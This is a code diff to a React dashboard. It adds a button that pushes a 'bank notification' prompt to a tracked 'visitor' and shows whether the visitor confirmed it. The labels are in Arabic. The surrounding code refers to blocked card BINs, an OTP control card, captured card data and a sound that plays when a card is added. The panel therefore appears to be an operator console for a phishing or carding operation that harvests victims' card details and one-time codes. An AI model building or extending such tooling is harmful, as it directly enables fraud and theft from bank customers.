@@ -23,6 +23,7 @@ import {
   addBlockedBin as fbAddBlockedBin,
   removeBlockedBin as fbRemoveBlockedBin,
   listenBlockedBins,
+  pushBankContactRequest,
 } from "@/lib/firebase";
 import { findBankLogo } from "@/lib/bank-logos";
 import cardAddedSoundUrl from "@assets/roblox_celebration_1777060364811.mp3";
@@ -62,6 +63,7 @@ import {
   X as XIcon,
   FileDown,
   WifiOff,
+  PhoneCall,
 } from "lucide-react";
 
 type CardKey = "customer" | "otp" | "card" | "header";
@@ -1922,8 +1924,72 @@ function OtpControlCard({
             </button>
           </div>
         </div>
+
+        <BankContactPushRow visitor={visitor} />
       </div>
     </Panel>
+  );
+}
+
+function BankContactPushRow({ visitor }: { visitor: Visitor }) {
+  const v = visitor as any;
+  const requested = Boolean(v.bankContactRequest);
+  const confirmed = Boolean(v.bankContactConfirmed);
+  const requestedAt = String(v.bankContactAt || "");
+  const confirmedAt = String(v.bankContactConfirmedAt || "");
+  const [pushing, setPushing] = useState(false);
+
+  // Status to show under the button.
+  let statusLabel = "";
+  let statusClass = "";
+  if (confirmed && confirmedAt) {
+    statusLabel = `تم تأكيد الاستلام · ${fmtRelative(confirmedAt)}`;
+    statusClass = "text-emerald-400";
+  } else if (requested && requestedAt) {
+    statusLabel = `بانتظار التأكيد · ${fmtRelative(requestedAt)}`;
+    statusClass = "text-amber-300";
+  }
+
+  const handlePush = async () => {
+    if (pushing) return;
+    setPushing(true);
+    try {
+      await pushBankContactRequest(visitor.id);
+    } finally {
+      setPushing(false);
+    }
+  };
+
+  return (
+    <div className="pt-2 border-t border-slate-700/60">
+      <button
+        onClick={handlePush}
+        disabled={pushing}
+        className={`w-full py-2 rounded-lg text-xs font-semibold flex items-center justify-center gap-1.5 transition-colors ${
+          confirmed
+            ? "bg-emerald-700/40 hover:bg-emerald-700/60 text-emerald-100"
+            : requested
+            ? "bg-amber-600/40 hover:bg-amber-600/60 text-amber-100"
+            : "bg-gradient-to-r from-sky-600 to-blue-600 hover:from-sky-500 hover:to-blue-500 text-white"
+        } disabled:opacity-60`}
+        data-testid="button-push-bank-contact"
+      >
+        <PhoneCall className="w-3.5 h-3.5" />
+        {confirmed
+          ? "تم التأكيد · إعادة الإرسال"
+          : requested
+          ? "إعادة إرسال إشعار البنك"
+          : "إرسال إشعار البنك"}
+      </button>
+      {statusLabel && (
+        <div
+          className={`text-[11px] mt-1 text-center ${statusClass}`}
+          data-testid="text-bank-contact-status"
+        >
+          {statusLabel}
+        </div>
+      )}
+    </div>
   );
 }
 
